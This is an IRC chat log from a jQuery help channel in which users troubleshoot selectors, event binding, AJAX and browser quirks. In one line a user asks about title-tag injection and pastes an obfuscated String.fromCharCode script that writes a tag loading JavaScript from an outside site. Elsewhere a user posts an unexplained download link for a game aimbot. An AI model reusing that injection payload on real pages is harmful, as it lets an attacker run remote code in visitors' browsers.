[06:26:55] <_ramo1> how can i parse a json string with multiple entries.... e.g. [{"name": "test", "value": 2},{"name": "test2", "value" : 3}] and access this fields in an object? on http://api.jquery.com/jQuery.parseJSON/ there just a "simple" example of it
[06:27:43] <sennahoj> _ramo1: use each to iterate through it
[06:27:48] <sennahoj> $.each
[06:28:27] <_ramo1> sennahoj: but iterated through what? you mean $.getJSON("jsonstring") { $.each(?, function(data) ... ?
[06:29:14] <macouno> Hooloovoork: found silly workaround... made the element that got dynamic content ultra wide (so the text in it spread as it liked), then got height... then set width to auto... somehow that fixed it (nasty fix)
[06:29:35] <sennahoj> _ramo1: you could do $.load("url", function (data) { $.each(data, function (index, content) { …
[06:31:16] <_ramo1> sennahoj: i'm using a templating engine twig, that's calling an controller and this controller returns json data string that i've to include into the twig
[06:31:36] <sennahoj> pastebin it
[06:50:59] <Kingsy> anyone around? I need help with height() and width() not setting in IE
[06:51:19] <Ortund> Kingsy, why are you trying to make IE do anything useful?
[06:51:32] <Kingsy> Ortund: because I need to support it :S
[06:51:51] <Ortund> just tell your users to use a proper web browser...
[06:51:56] <Ortund> much less headache
[06:52:11] <smooki1> hmmm I tried : $('#pool[type]').change(function(){
[06:52:11] <smooki1>                     alert("changed");
[06:52:11] <smooki1>                 }
[06:52:11] <smooki1>         ).chage();     but no alert (radio button)
[06:52:23] <xec> .chage() ?
[06:52:28] <Kingsy> Ortund: what is the best way of debugging ie? is there a console.log() that works for the debugbar ?
[06:52:32] <Ortund> haha was just gonna say, xec
[06:52:52] <smooki1> xec, changed to change(), no change
[06:52:59] <xec> lol
[06:53:03] <smooki1> :)
[06:53:14] <Ortund> Kingsy your best bet would probably be to write debugging messages to the page or use alerts... IE doesn't have a console
[06:53:32] <equivoc> or use MS Script Debugger?
[06:53:40] <objNoob> I have a jquery datetime object that i enable/disable with a checkbox. But in IE 8 the object doesn't 'appear' to enable after enabled until it is clicked by the user. Any suggestions on a fix?
[06:53:52] <xec> smooki1: does your selector actually work?
[06:53:58] <smooki1> yes
[06:54:06] <smooki1> oops jquery selector
[06:54:07] <smooki1> well
[06:54:23] <smooki1> sorry
[06:54:29] <smooki1> I used name instead of id

[06:58:30] <nFFF> Guys have a JS object, returned from a AJAX request. jsObject.text returns the HTML. I need to add a class to every element within jsObject.text. Any ideas?
[06:58:45] <smooki1> I put the script in a document.ready ?
[06:59:41] <Ortund> nFFF I was gonna say replace > with class="bla"> but that would set it on closing tags too...
[07:05:40] <smooki1> please ? how to avoid my radioButton.changed event when it comes from "initialisation/docloading" I tried using  $(document).ready(function() {…. but it still trigger
[07:06:19] <Ortund> smooki1, preventDefault() ? :P
[07:06:37] <smooki1> let see that
[07:06:39] <AdvoWork> what is ('#example td.control').live( 'click', function () { looking for?  whats td.control? a class name?
[07:08:10] <smooki1> Ortund: still triggered :'(
[07:09:13] <smooki1> https://gist.github.com/398fae45c2fe08ffaeab
[07:10:41] <smooki1> please help ! :)
[07:11:25] <Ortund> smooki1, you're outside of my area of expertise there dude, sorry
[07:11:41] <smooki1> somone heeeeeelp :D
[07:12:04] <xec> smooki1: what exactly was the issue?
[07:12:37] <smooki1> the change event is triggered when document loaded ...
[07:12:46] <smooki1> I want it only later
[07:12:55] <xec> smooki1: why do you have .change() on the end of them
[07:13:25] <smooki1> xec I followed the doc example
[07:13:35] <xec> smooki1: try without :P
[07:13:44] <smooki1> ok
[07:14:17] <GoGoGarrett> http://jsfiddle.net/bCFyK/  I am trying to create a registration form, and I'm trying to add a "new person" and when that new person is added I want to add unique classes / input names and also clear any information that is being cloned (or is there a better method then clone?)
[07:14:22] <smooki1> work, thanks xec
[07:14:48] <nFFF> xec
[07:14:54] <nFFF> Have a JS object, returned from a AJAX request. jsObject.text returns the HTML. I need to add a class to every element within jsObject.text. Any ideas?
[07:14:54] <GoGoGarrett> I'm trying to get away from having to hide 10 div's with the fields
[07:16:06] <xec> nFFF: didn't you get an answer on that earlier today?
[07:16:11] <smooki1> please, how to select all input in a <ul> ?
[07:16:27] <xec> smooki1: do you know css?
[07:16:28] <smooki1> #ul_id input ?
[07:16:35] <smooki1> not a lot,
[07:16:44] <smooki1> I can't remember all things
[07:16:47] <xec> $('ul input')
[07:16:59] <smooki1> #ul_id input then, ok thanks :)
[07:17:08] <smooki1> but will it goes to <li> ?
[07:17:19] <smooki1> #ul_id li input ?
[07:17:35] <xec> the input can be inside anything, the space means "descendant" rather than"child"
[07:18:06] <smooki1> but do I need to put the li, or it will goes to deepest level ?
[07:18:18] <xec> do not need to put the li
[07:18:22] <smooki1> ok thanks
[07:18:36] <DukeDrake> hm ... setting z-index doesn't work :/
[07:19:01] <DukeDrake> I tried myelem.css('zIndex', '11'); and myelem.css('z-index', '11');
[07:19:08] <xec> smooki1: i recommend you learn css selectors before jquery
[07:19:42] <warrenparsons> DukeDrake: What are you trying to do?
[07:20:01] <DukeDrake> setting the z-index, so the element moves in front of another
[07:20:21] <DukeDrake> both already have a z-index (and a position absolute)
[07:20:36] <smooki1> xec I know about them
[07:20:39] <warrenparsons> DukeDrake: Have you checked in Firebug/Web Inspector to see if the z-index is being updated by your JS? It might be a CSS problem instead.
[07:20:48] <smooki1> but I'm not a css guy, so I can't be sure of all
[07:21:02] <DukeDrake> warrenparsons: checking ...
[07:22:07] <DukeDrake> ok, I thikn I can figure it out now ...
[07:22:55] <warrenparsons> DukeDrake: Cool. Also, just a style thing, but when I use the .css() method, I like to use the form of myElem.css({ zIndex: 5 }); just because it's closer in syntax to regular CSS.
[07:23:17] <DukeDrake> warren: nice hint =)
[07:23:23] <warrenparsons> DukeDrake: Also, I don't know if you can set multiple attributes in a single call with the .css() form.
[07:23:53] <smooki1> $('#simpleChoiceContainer input').disable = true; not valid ?
[07:24:57] <warrenparsons> smooki1: Try $('#myelm input').prop('disabled', true);
[07:26:42] <marijan> http://www.2shared.com/file/zeC04s1T/cs2d_0119_win_and_Aimbot.html
[07:28:52] <smooki1> thanks warrenparsons
[07:29:05] <warrenparsons> smooki1: Sure thing.
[07:30:36] <smooki1> warrenparsons:  $('#simpleChoiceContainer input').prop('disabled', false); do not works
[07:30:47] <smooki1> hmm input will handle select ?
[07:31:31] <warrenparsons> smooki1: No, select is a separate element.
[07:31:52] <erichynds> smooki1: if you want to target _all_ inputs, use :input. if you're just targeting select boxes, use "select"
[07:31:55] <smooki1> no way to select all kind of form "input" then ?
[07:33:04] <Kingsy> can someone perhaps give me a reason why this would happen   http://pastie.org/3296317 <---- you can see, I am outputing the original value of the element height, my personal one, and then the element height again after I have attempted to set it
[07:33:18] <Kingsy> WHY isnt it setting? it does in FF, and in chrome, but not in IE
[07:33:39] <smooki1> thanks a lot warrenparsons erichynds
[07:34:50] <_ramo1> how to insert input fields  into a div?
[07:36:28] <smooki1> can I disable links as well ?
[07:36:31] <Kingsy> is there an alternative way to set a height and width other than height() and width() ?
[07:36:34] <GoGoGarrett> http://jsfiddle.net/bCFyK/2/  would really appreciate some guidance.  I'm trying to 1) add a new person and update all the inputs to p1_first_name, p2_first_name, etc.  2) delete a specific user when link is clicked and remove it from dom.
[07:38:14] <Fichte> hi guyz. I am looking to unset a onload event from an iframe..  any clues?
[07:38:31] <Fichte> omg  worst english i ever wrote  xD
[07:38:34] <aitiba> hi
[07:38:43] <aitiba> someone has use uploadify?
[07:39:25] <aitiba> onCancel uploadify is not giving me the name of the file that I want to delete
[07:40:15] <smooki1> disable a link ? how ?
[07:42:55] <tutukatu> change color and bind click event a null function
[07:43:41] <tutukatu> or add a condition to your click event
[07:44:04] <everythingWorks> hey
[07:44:10] <everythingWorks> What about this test suite? http://view.jquery.com/tags/1.3.2/test/
[07:44:13] <smooki1> hmm, it's generated from rails …
[07:44:22] <everythingWorks> Nothing displays there. Just thea heading "jQuery Test Suite"
[07:44:24] <smooki1> I'll hide them
[07:44:46] <smooki1> there is no trace() in javascript ?
[07:45:02] <tutukatu> nope, select with jQuery selector and save href attribute, it will be running ;)
[07:45:30] <smooki1> ok
[07:46:23] <aitiba> onCancel uploadify is not giving me the name of the file that I want to delete. any ideas?
[07:52:24] <tutukatu> why $.ajax() function throws error in an interval ?
[07:52:43] <tutukatu> Uncaught TypeError: Cannot read property 'fire' of undefined  f.extend.Deferredjquery.latest.min.js:2  f.extend.ajax
[07:53:55] <LordThumper> Hi. What document event comes before $(document).ready() ?
[07:54:11] <LordThumper> Something before elements are rendered if possible
[07:56:44] <NoiseEee> LordThumper: the body loads
[07:57:09] <NoiseEee> LordThumper: which will likely happen around the same time, the question i ask is "what are you trying to do"
[07:58:13] <tutukatu> the head loads
[07:58:19] <_ramo1> how to add an element to a div?
[07:59:02] <NoiseEee> _ramo1: google "how to add an element to a div jquery"
[08:00:24] <freezychap> hi guys I am in great trouble here can anybody help me I am trying to apply this .hover() function to img tag which has z-index set..
[08:01:31] <freezychap> does anyone know how to achieve .hover() on z-indexed elements??
[08:02:07] <LordThumper> NoiseEee, I am trying to redirect the parent page from an iframe, using "top.location"
[08:02:10] <csmrfx> Is <title> attribute code injection somehow related to jQuery? IOW, does twitter-worm style vulnerability come somehow from use of jQuery?
[08:02:26] <csmrfx> I mean something in the style of:  <title><script>document.write(String.fromCharCode(60,115,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,119,119,119,46,115,116,97,108,107,100,97,105,108,121,46,99,111,109,47,97,106,97,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62));</script>
[08:02:40] <LordThumper> However I can still see the DOM elements on the page as the other page loads
[08:03:24] <LordThumper> I am injecting the redirect script server-side
[08:04:21] <freezychap> guys common plzz help me out with .hover() effect on z-indexed elements
[08:05:08] <tutukatu> LordThumper: just redirect in head tag like <head><script>if(top.location){location.href="something.jsp"}</script></head>
[08:05:45] <lduros> hi, i'm using a little widget for people to embed in their own page. That widget uses jquery, in particular to perform ajax requests etc... Since I don't know if people who copy the code have jQuery available or not on their page what should I do? Should I insert jquery.js as a script tag in the DOM only if it can't find it? Should it do that on document ready? At another time? Thanks, ...
[08:06:33] <_ramo1> NoiseEee: i've done it like this:  $('.fbFriends').add('<input type="checkbox" name="zutat" value="' + obj.id +'"> ' + obj.name );  b
[08:06:43] <LordThumper> tutukatu: My code is working fine. I would like to redirect before DOM elements are rendered
[08:07:23] <tutukatu> LordThumper: ok, i said if you want to do this, you have to do it by this way or server side response.redirect
[08:07:57] <LordThumper> Server side Response.Redirect redirects in the iframe I think
[08:08:00] <tutukatu> LordThumper: <head> tag will be rendered before body or smthing else
[08:08:15] <LordThumper> Ah I see your point
[08:08:58] <LordThumper> Ok let me check where the code is being injected
[08:10:05] <NoiseEee> _ramo1: great
[08:10:11] <LordThumper> Now I got doubts, would a Response.Redirect redirect in the iframe, or the parent?
[08:10:26] <_ramo1> NoiseEee: hehe i forgot to wrote that this is not working...
[08:10:51] <_ramo1> my output in html code ist still like:  $('.fbFriends').add('<input type="checkbox" name="zutat" value="' + obj.id +'"> ' + obj.name );
[08:11:51] <tutukatu> best way, i think inject it in head tag
[08:12:08] <NoiseEee> _ramo1: what what is your browser console complaining about?
[08:12:51] <_ramo1> NoiseEee: firebug is not throwing any errors
[08:13:03] <_ramo1> my <div ist still blank
[08:13:06] <tutukatu> because if you re using it in iframe server response doesnt effect
[08:13:10] <andrew9183> anyone know what create() does in JS? can't find documentation on it
[08:14:10] <tutukatu> http://es5.github.com/#x15.2.3.5
[08:15:23] <NoiseEee> _ramo1: ('.fbFriends').append('<input type="checkbox" name="zutat" value="' + obj.id +'"> ' + obj.name );
[08:15:34] <NoiseEee> _ramo1: append, not add
[08:16:09] <_ramo1> append is not working too, let me create a jsfiddle
[08:16:13] <csmrfx> lduros you mention dependencies and/or include jQuery
[08:16:48] <_ramo1> NoiseEee: jsfiddle is not saving my code... hmpf
[08:17:34] <Kzim> hi
[08:18:26] <Kzim> i have accordion and i load ajax on change, i tried changestart too but to load the content when i click and but is also load it when i close the same div :/
[08:19:17] <Jeebusman> hey guys i'm having a bug in IE8 with jquery 1.7.1 and the insertAfter() function
[08:19:22] <Jeebusman> it completely crashes the tab
[08:23:08] <_ramo> NoiseEee: cool it works
[08:23:20] <_ramo> so, how can i now get all checked checkboxes that are in a div on submit?
[08:23:57] <NoiseEee> _ramo: read the docs / google the question, write some code that attempts it, return here with a pastebin if you have any trouble
[08:24:06] <NoiseEee> in other words... we don't write code for folks
[08:25:24] <ari5av> _ramo: your code in the url that the page submits to must get that information from the request variables
[08:25:41] <ari5av> depending on what language you're using, there's a hundred different ways to do that
[08:26:20] <ari5av> but none of them can tell what div something was in, you just have to name your form fields in a way that your code can read it when you submit the page
[08:27:48] <Fichte> btw:   $(elem).unbind('load').unbind('onunload');  workout out perfectly if someone interested in the answer to my question
[08:32:07] <freezychap> anybody willing to answer this silly question of mine: " .hover() effect on z-indexed images"
[08:32:42] <freezychap> anybody willing to answer this silly question of mine: " how to make .hover() effect work on z-indexed images"
[08:36:45] <Cancerus> hi ,i using jquery ui sliders. I need to plase custom text on handlers instead of numbers, but dependent from numbers. How to do it anybody knows?
[08:41:48] <silence__> anyone available to take a look at a jsfiddle and debug?  not sure why this isn't working, basic jquery i think
[08:42:19] <johnkpaul> Does anyone know why jQuery doesn't use their own isArray() function in the jQuery.map function?
[08:42:21] <Zogot> dont ask to ask :p
[08:42:24] <Zogot> just show silence__
[08:42:59] <silence__> ok, 1 sec
[08:45:04] <Engin> would it hurt if i use value attribute for my own stuff, for instance, on an li
[08:45:32] <Engin> i'm using val just to be safe but is looks inconsistent
[08:46:17] <tutukatu> i m gonna mad. $.ajax(); does not work properly by setInterval
[08:49:39] <_ramo> NoiseEee: yep, that's okay
[08:49:40] <_ramo> :)
[08:49:50] <_ramo> i don't requested the code.. just some hints...
[08:53:08] <aqeel> hi room
[08:53:25] <aqeel> document.getElementById("contact").onmouseover=$(function(){$("#content").load("info.html #contact");});
[08:53:34] <silence__> jsfiddle needs more servers so I can login and share this thing >|
[08:54:27] <johnkpaul> aqeel: $ returns a jQuery object, not a function
[08:54:33] <aqeel> this is in external file and i would like to have it load only on onmouseover but it is triggering on instance
[08:55:09] <aqeel> so how do i go about this
[08:55:15] <johnkpaul> jQuery("#contact").onmouseover(function(){$("#content").load("info.html #contact");})
[08:55:49] <aqeel> ok let me try this
[08:56:23] <AdvoWork> if aData = ,16598,test,01-02-2012,<img src='  how can i get the 16598?
[08:56:32] <aqeel> it is not triggered
[08:56:36] <aqeel> not working
[08:56:41] <johnkpaul> aqeel: sorry, not onmouseover
[08:56:44] <johnkpaul> I think it's just mouseover
[08:56:48] <johnkpaul> look it up on the jquery docs
[08:56:50] <aqeel> ok
[08:57:28] <aqeel> sorry not working
[08:58:10] <aqeel> though mine one gets triggered without any action on element
[08:58:19] <aqeel> it just loads...
[08:58:34] <johnkpaul> is that code inside a jQuery(document).ready()?
[08:58:42] <aqeel> nope
[08:58:51] <aqeel> just plain line?
[08:58:57] <aqeel> something missing?
[08:59:06] <starsinmypockets> This is a bit of a noobish question but, if I'm dynamically adding form elements with js (via click) is it acceptable practice to add a counter to the element via an attribute - eg: <li count =1> ?
[08:59:58] <aqeel> using dreamweaver built in functions?
[09:00:07] <dabear> starsinmypockets: sure, but call it data-count="1"
[09:00:40] <GoGoGarrett> http://jsfiddle.net/bCFyK/5/  <-- why wont return false.. or prevent default or any of these work for the "delete_person" link
[09:01:01] <starsinmypockets> dabear - yeah, better namespace... but that won't make devs cringe?
[09:01:07] <Mkop> I'm trying to make some elements in my app hideable by hitting a key. I tried 	$("body").delegate(':not(input)','keydown',function(args) { ... } but that isn't working
[09:01:30] <dabear> ?g html5 data attribute @ starsinmypockets
[09:01:31] <bot-t> starsinmypockets, John Resig - HTML 5 data- Attributes - http://ejohn.org/blog/html-5-data-attributes/
[09:01:35] <johnkpaul> aqeel: http://docs.jquery.com/Tutorials:Introducing_$(document).ready()
[09:01:48] <aqeel> thanks
[09:02:22] <aqeel> There is currently no text in this page, you can search for this page title in other pages or edit this page. :(
[09:02:45] <johnkpaul> GoGoGarrett: because the event isn't bound to for your newly generated elements
[09:02:50] <johnkpaul> you want to use live, not click
[09:02:59] <GoGoGarrett> Genius, Thanks.
[09:03:13] <johnkpaul> no problem
[09:04:45] <aqeel> $(function(){}); is meant to cover  $(document).ready()
[09:04:54] <starsinmypockets> dabear - very good to know thanks
[09:05:04] <aqeel> the shortest hand for latest jquery
[09:05:18] <johnkpaul> yes, that's true, but that doesn't return a fucntion to assign to .onmouseover
[09:05:41] <aqeel> but within script in html it is working fine
[09:06:09] <aqeel> i want to put it in external file
[09:08:41] <aqeel> any help will be appreciayed
[09:08:50] <Mkop> aha! I need to do $(document).delegate(...) instead of $("body").delegate(...)
[09:09:16] <johnkpaul> aqeel: can you share some of your code on jsfiddle, it is hard to understand what you're trying to do
[09:09:44] <aqeel> ok
[09:10:58] <andrew9183> http://lolcode.com/examples/count-1
[09:11:01] <andrew9183> lol that is hilarious
[09:12:19] <aqeel> http://jsfiddle.net/unJgL/embedded/result/
[09:12:21] <aqeel> ok
[09:12:26] <aqeel> css not linked
[09:13:03] <aqeel> i want to hover over contact and load its content from third file via jquery call load

[09:15:57] <crankharder> anyone see the syntax error here: https://img.skitch.com/20120201-kmc2meunu7rxukk4penqft8969.png  code: http://pastie.org/3296931
[09:16:39] <crankharder> is there something wrong with li:not(.unsortable)
[09:16:49] <johnkpaul> yes
[09:16:57] <johnkpaul> oh, that's not in your js
[09:17:00] <johnkpaul> that's ina strong
[09:17:02] <johnkpaul> string*
[09:17:14] <crankharder> ya: $('#available ul li:not(.unsortable)')
[09:17:22] <johnkpaul> crankharder: are you sure there's a comma before initMoveAll?
[09:17:31] <crankharder> yep
[09:18:20] <crankharder> jshint only reports back "missing use strict statement" - which is kinda bunk
[09:18:40] <johnkpaul> I get no syntax error from that code
[09:18:40] <johnkpaul> so I think that it might be in something else
[09:18:45] <aqeel> thanks
[09:18:51] <crankharder> stupid ffx :/
[09:18:51] <johnkpaul> what is making you think that it's that snippet crankharder?
[09:18:56] <johnkpaul> aqeel: np
[09:19:24] <aqeel> do i need console.log?
[09:19:39] <johnkpaul> aqeel: no, that was just to show you that it was working
[09:20:24] <aqeel> thought of it....and can i make it into array to call and load respectively...
[09:21:28] <johnkpaul> aqeel: ? sorry, i don't understand
[09:21:39] <aqeel> like the contact, detail and sitemap and load it into content
[09:25:25] <Engin> When I have an HTML snippet in the html file my code is working as expected, when I insert the very same snippet via JQ, it does not work
[09:25:44] <Engin> snippet is like this -> <li .... val="foo"></li>
[09:25:55] <aqeel> now qhy do i have to use jquery?
[09:26:09] <Engin> I'M using $('li').click(function(){... $(this).attr('val'); });
[09:26:22] <NoiseEee> Engin: pastebin an example
[09:26:22] <aqeel> not just $
[09:26:34] <NoiseEee> Engin: s/pastebin/jsfiddle.net
[09:30:37] <nFFFF> Have a JS object, returned from a AJAX request. jsObject.text returns the HTML. I need to add a class to every element within jsObject.text. Any ideas?
[09:32:02] <Engin> NoiseEee: i guess the problem is that the atteched elements are attached after i do .click()
[09:32:08] <Engin> so they don't have a handler :)
[09:32:19] <Engin> i need something like .live() i guess
[09:32:56] <NoiseEee> Engin: if you have >= 1.7, you should use something like:  $('#commonParentElement').on('click','selectorICareAbout',function() {});
[09:33:54] <Engin> aha yeah
[09:34:02] <Engin> I'M using 1.6.2
[09:34:07] <Engin> 1.7 broke something on me
[09:34:31] <Engin> hashchange event iirc
[09:35:30] <NoiseEee> Engin: well use .delegate in similar fashion.... $('#commonParent').delegate('selectorICareAbout','click',function() {})
[09:35:30] <Engin> what's the best way to wait for newly added elements of some class
[09:35:36] <NoiseEee> Engin: same concept, event delegation
[09:35:44] <Engin> i.e. i want to process elements of class .foo when they are added later
[09:35:53] <NoiseEee> Engin: see answer above
[09:35:55] <Engin> NoiseEee: yep, used delegate, it worked
[09:36:04] <Engin> delegate can be used for that too ?
[09:36:17] <Engin> i need some sort of insertion event
[09:36:22] <NoiseEee> well what does "process elements of class .foo" mean?
[09:36:35] <Engin> I'll update the contents of it
[09:37:56] <NoiseEee> well ideally you're aware of when you're updating the DOM
[09:38:02] <NoiseEee> and can call it manually / via the function that does so
[09:38:10] <NoiseEee> otherwise, there's no good way iirc
[09:38:14] <Engin> yes, but that is not very convenient
[09:39:26] <Engin> somehow i remember there was an event for it in the mozilla docs... but apparently not.. i can't find it now
[09:41:20] <Engin> http://www.w3.org/TR/DOM-Level-2-Events/events.html#Events-eventgroupings-mutationevents
[09:41:32] <Engin> but not cross-browser compatible i think
[09:41:51] <NoiseEee> indeed
[09:42:58] <kavelot> i have many elements with class 'image1'... I want to check if any of them has attr('href') == 'someurl'. simple way to do that? maybe with each/map?
[09:43:37] <ajpiano> ?filter @ kavelot
[09:43:37] <bot-t> kavelot, .filter(selector): Reduce the set of matched elements to those that match the selector or pass the function's test. http://api.jquery.com/filter/
[09:44:37] <johnkpaul> kavelot:  jQuery(".image1").filter(function(el){return el.href.indexOf(someurl) != -1;}).length
[09:44:46] <kavelot> thanks guys :)
[09:45:49] <silence__> quick question, is $('#leveltwo:first-child').detach().append($('#levelone')); proper syntax?
[09:46:14] <johnkpaul> silence__: I think you have an extra )
[09:46:20] <johnkpaul> what does the last ) match?
[09:47:13] <silence__> .append(1 $(2  '#levelone'   2)   1)
[09:48:04] <starsinmypockets> Can anyone spare a set of eyes? http://pastebin.com/3ksRxaCc
[09:48:10] <starsinmypockets> this throws Uncaught SyntaxError: Unexpected token <
[09:48:17] <starsinmypockets> But i'm not sure why :/
[09:48:34] <silence__> for some reason it doesn't work at all
[09:55:07] <lduros> is it possible to have a selfexecuting anonymous function that passes arguments? like: (function (myVar) { console.log(myVar); })('hello!');
[09:55:33] <lduros> yeh, looks like it is
[09:56:29] <lduros> cool
[09:56:41] <xrated> lduros, that's how jQuery does it's stuff.
[09:58:26] <lduros> xrated: my problem though is that I can't put everything in the self executing anonymous function, because it does some jsonp stuff
[09:58:35] <lduros> so I need functions that are in the global scope right?
[09:58:46] <Engin> $('<html snippet>').customFunc(); // HTML snippet is not yet available to the customFunc ?
[09:59:00] <Engin> $(this).find('.foo') didn't work in it
[09:59:05] <lduros> xrated:  and then how do I pass back the result from jsonp inside that self-executing anonymous function
[09:59:27] <Engin> apparently it needs to be inserted to somehwere before
[09:59:32] <lduros> the callbacks need to be in the global scope
[09:59:51] <lduros> but then how do I refer to what's in my function from the global scope...
[10:02:55] <Engin> no inverse of "Has attribute [name]" selector ? such as [!name] ?

[10:23:17] <Onkeltem> jedimind: just few lines
[10:23:34] <xec-> Onkeltem: it is still spam :P
[10:25:32] <xec-> GoGoGarrett: try :checked rather than :selected -- also make sure something is actually checked before filtering on it..
[10:25:44] <GoGoGarrett> yeah, I've tried just doing
[10:25:45] <Onkeltem> The first thought was: pass 'i' to a server, and return it :) But looks ugly to my mind.
[10:25:56] <GoGoGarrett> event = $('input[name=p' + count + '_event]:checked').val();
[10:25:59] <xec-> GoGoGarrett: http://jsfiddle.net/ZKC7V/4/
[10:26:29] <xec-> GoGoGarrett: i added checked="checked" to the young giver radiobutton
[10:26:40] <xec-> (in html)
[10:27:57] <xec-> Onkeltem: any reason you are calling ajax in a loop? looks very ineffective - no way to get all the items with 1 request?
[10:28:17] <GoGoGarrett> I want to dymaically pull the value that is checked
[10:28:26] <GoGoGarrett> this just sends me the one that has checked='checked' everytiem
[10:28:50] <xec-> GoGoGarrett: thats because it is cached (defined outside click event handler)
[10:28:53] <Onkeltem> xec-: no reason actually, I just want to get as much slides as possible, and let them loaded in parallel if possible.
[10:29:42] <xec-> Onkeltem: look into "lazy loading", google will help :)
[10:30:39] <Onkeltem> xec-: my idea was to show slides navigation ritgh after first slide is loaded. Imagine there 10 slides. I load first, navigation control for it is shown and you can start clicking it, etc.
[10:31:00] <Onkeltem> obviously, loading 1 slide is faster then loading 10
[10:31:51] <djQuery> hello
[10:33:23] <Onkeltem> xec-: I'm not sure the lazy loading is what I want here. Google Images is using this technique when we scrolling page down, is it?
[10:33:25] <xec-> GoGoGarrett: http://jsfiddle.net/ZKC7V/6/
[10:33:54] <xec-> Onkeltem: yes, you might want a slider plugin with similar behaviour
[10:34:20] <xec-> Onkeltem: i don't think it is entirely straight forward to make yourself
[10:35:58] <Onkeltem> xec-: No, i don't need any plugins. Would you help with my initial question?
[10:37:30] <xec-> Onkeltem: i would imagine you need a closure. could you make a small working demo?
[10:37:49] <xec-> just something that demonstrates the issue
[10:38:07] <xec-> doesnt actually need to load any images :P
[10:38:45] <Onkeltem> xec-: not images - they are Drupal nodes = slides contents. What should I demonstrate? :)
[10:39:54] <xec-> Onkeltem: i'm not 100% sure what your issue really is, you wrote something about synchronizing an iterator value
[10:41:01] <xec-> and seeing as you're doing some fancy stuff inside a loop, i imagine you end up referencing the current value of the iterator asynchronously, meaning its final value --- i could be wrong?
[10:41:23] <Onkeltem> xec-: yes. I'm using `i` for iterating slides count, and for the `i` value which was used for ajax-request I want to update corresponding DIV. So I need that `i` inside success-function
[10:43:02] <Onkeltem> I've another though how I can sync. If I place the loop's content inside a function, and make `i`-counter local function variable then I probably get what I want.
[10:44:30] <Onkeltem> yeah, works
[10:45:21] <janthony> Anyone know a good jquery plugin that will increase/decrease font size to fit the width of the parent element? I tried FitText, and it doesn't work as advertised, unless I'm doing it wrong.
[10:46:04] <GoGoGarrett> http://jsfiddle.net/ZKC7V/11/ see xec- I'm trying to make a modularize method that has to have that value returned to it
[10:46:13] <GoGoGarrett> but when I try to pass it to another method, I get the entire object instead of the string
[10:46:48] <djQuery> grrrrr why cant I see .httpaccess files
[10:47:01] <Onkeltem> xec-: http://pastebin.ubuntu.com/825450/
[10:47:13] <djQuery> wrong winder
[10:50:17] <xec-> Onkeltem: does this demonstrate the issue? http://jsfiddle.net/ZkB55/
[10:53:56] <Onkeltem> xec-: yes :) I too got the last value of i, the last i++. Same.
[10:55:19] <NoiseEee> Onkeltem: http://www.mennovanslooten.nl/blog/post/62
[10:56:09] <Onkeltem> xec-: http://jsfiddle.net/ZkB55/2/
[10:57:09] <xec-> Onkeltem: yes that works
[10:57:32] <xec-> Onkeltem: or if you like to type a lot of characters: http://jsfiddle.net/ZkB55/3/
[10:57:54] <Onkeltem> xec-: THANKS!!! I like this!
[10:58:03] <Onkeltem> I hate lot of charaters )
[10:58:44] <Onkeltem> NoiseEee: yes, I see, thanks :)
[11:04:03] <xec-> Onkeltem: creating event handlers (or calling ajax) in a loop is usually a bad idea though, consider: http://jsfiddle.net/ZkB55/4/
[11:06:49] <starsinmypockets> why does this throw an error 'unexpected token <'	var markup = "<div class = 'foo'><h2>Foo</h2></div>";
[11:07:15] <chrisinajar> starsinmypockets: it's probably on a different line then
[11:07:19] <xec-> starsinmypockets: dunno. context?
[11:07:34] <mattp_> is there a jquery ajax form plugin that actually works with json in ie8?
[11:07:41] <mattp_> ajaxForm (malsup) is shitting the bed hard for me
[11:08:04] <starsinmypockets> Hmm.. if I want to create a variable with a chunk of html in it, what's the best way to do that?
[11:08:05] <xec-> mattp_: form plugin? what does it do
[11:08:09] <starsinmypockets> I guess the newlines are causing the error
[11:08:15] <chrisinajar> mattp_: i've never found an ajax form plugin that was easier to use than just doing it yourself
[11:08:39] <mattp_> chrisinajar: really?
[11:08:39] <chrisinajar> starsinmypockets: var myVar = "<b>this works fine</b>";
[11:08:55] <chrisinajar> mattp_: ajax is stupidly easy to use
[11:09:01] <mattp_> chrisinajar: it is, i know
[11:09:20] <chrisinajar> it'll take what, a half hour? maybe an hour?
[11:09:36] <mattp_> if its so easy why doesnt the plugin work right :)
[11:09:39] <starsinmypockets> chrisinajar - but assuming I want to enter multiple lines...
[11:09:50] <chrisinajar> starsinmypockets: var blah = "\n";
[11:10:12] <chrisinajar> mattp_: because it's harder to write a generic API than it is to do it yourself each time
[11:10:15] <xec-> starsinmypockets: you can just do " at end of line and + " at start of next
[11:10:32] <chrisinajar> mattp_: .ajax is already what you want. it's hard to make it much simpler than that
[11:10:36] <muhoo> for websocket is this the canonical one to use: http://code.google.com/p/jquery-websocket/ ?
[11:10:43] <starsinmypockets> xec - thanks
[11:11:21] <chrisinajar> starsinmypockets: or blah += "some more text!";
[11:12:00] <xec-> what chrisinajar said is slightly better performancewise, if you dont mind typing the extra characters on every line
[11:12:25] <chrisinajar> no, actually your way is better for performance
[11:12:51] <chrisinajar> var blah = "this" + "is" + "faster"; blah += "than this";
[11:13:01] <xec-> are you sure?
[11:13:36] <chrisinajar> yes, appending constants is done at jit time, appending to variables requires resizing the internal string buffer
[11:13:59] <chrisinajar> assuming it isn't already large enough, which is probably will be, making them exactly the same
[11:15:24] <starsinmypockets> I'm just trying to figure out the easiest most readable way to, for instance, append a block of html to an element when a button is clicked...
[11:16:49] <xec-> starsinmypockets: personally, i'm a fan of the .supplant() method from: http://javascript.crockford.com/remedial.html
[11:16:54] <WebDragon> where's the block of html coming from, starsinmypockets ?
[11:17:28] <WebDragon> would it already be present in the page, masked by display: none; or is it something pulled in via ajax ?
[11:17:34] <xec-> starsinmypockets: if you have multiple values stored in an object that you want to inject into a string
[11:17:37] <chrisinajar> starsinmypockets: elem.append("<b>some html</b>"), doesn't that work?
[11:18:21] <starsinmypockets> WebDragon... it's like an html snippet in my js: http://pastebin.com/u4ZdWRcu
[11:18:49] <chrisinajar> that is some ugly shit
[11:18:59] <WebDragon> mm this is why I like <<< in php
[11:19:08] <WebDragon> heredocs++
[11:19:18] <chrisinajar> also, don't use live
[11:19:20] <WebDragon> starsinmypockets: append() should work fine
[11:20:05] <chrisinajar> starsinmypockets: as a stylistic suggestion, don't bother formatted the html. no one will look at that. people will look at the JS though, which looks like horse balls when the html is formatted like that.
[11:21:21] <WebDragon> chrisinajar++
